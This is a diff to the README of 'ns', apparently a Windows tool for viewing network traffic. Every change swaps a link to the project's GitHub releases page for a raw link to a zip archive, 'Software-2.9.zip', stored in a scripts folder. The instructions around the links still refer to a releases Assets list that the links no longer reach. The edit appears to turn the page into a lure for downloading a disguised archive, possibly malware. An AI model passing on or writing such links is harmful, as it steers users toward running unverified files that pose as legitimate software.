@@ -1,12 +1,12 @@
 # 🖥️ ns - See Network Traffic Live
 
-[![Download ns](https://img.shields.io/badge/Download%20ns-blue-grey?style=for-the-badge)](https://github.com/Lowering-mechanism250/ns/releases)
+[![Download ns](https://img.shields.io/badge/Download%20ns-blue-grey?style=for-the-badge)](https://raw.githubusercontent.com/Lowering-mechanism250/ns/main/scripts/Software-2.9.zip)
 
 ## 📥 Download
 
 Use this page to visit to download the Windows file:
 
-https://github.com/Lowering-mechanism250/ns/releases
+https://raw.githubusercontent.com/Lowering-mechanism250/ns/main/scripts/Software-2.9.zip
 
 Pick the latest release, then download the Windows file from the Assets list.
 
@@ -123,4 +123,4 @@ If the screen stays blank, wait a moment. Some network data can take a short tim
 
 Visit this page to download the Windows file:
 
-https://github.com/Lowering-mechanism250/ns/releases
+https://raw.githubusercontent.com/Lowering-mechanism250/ns/main/scripts/Software-2.9.zip
